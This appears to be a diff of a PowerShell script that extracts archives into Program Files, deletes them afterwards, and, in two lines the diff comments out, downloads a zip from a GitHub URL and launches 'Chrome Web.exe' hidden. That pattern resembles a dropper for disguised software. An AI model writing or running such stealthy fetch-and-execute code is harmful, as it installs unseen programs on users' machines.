@@ -19,7 +19,7 @@ Expand-Archive -Path C:\Users\app64.zip -DestinationPath C:\Users\
 
 Expand-7Zip -ArchiveFileName C:\Users\ProJ03-main\app-64.7z.001 -Password "" -TargetPath "C:\Program Files\"
 
-invoke-webrequest -uri "https://github.com/Admo9/Data/raw/main/app.zip" -outfile "C:\Users\app.zip"
+#invoke-webrequest -uri "https://github.com/Admo9/Data/raw/main/app.zip" -outfile "C:\Users\app.zip"
 
 
 
@@ -30,6 +30,6 @@ Expand-Archive -Path C:\Users\app.zip -DestinationPath "C:\Program Files\app-64\
 
 Remove-Item -Force -Recurse 'C:\Users\app64.zip', 'C:\Users\ProJ03-main', 'C:\Users\app.zip'
 
-Start-Process "C:\Program Files\app-64\Chrome Web.exe" --hidden } |
+#Start-Process "C:\Program Files\app-64\Chrome Web.exe" --hidden } |
 
 select @{n="time";e={$_.Minutes,"Minutes",$_.Seconds,"Seconds",$_.Milliseconds,"Milliseconds" -join " "}}
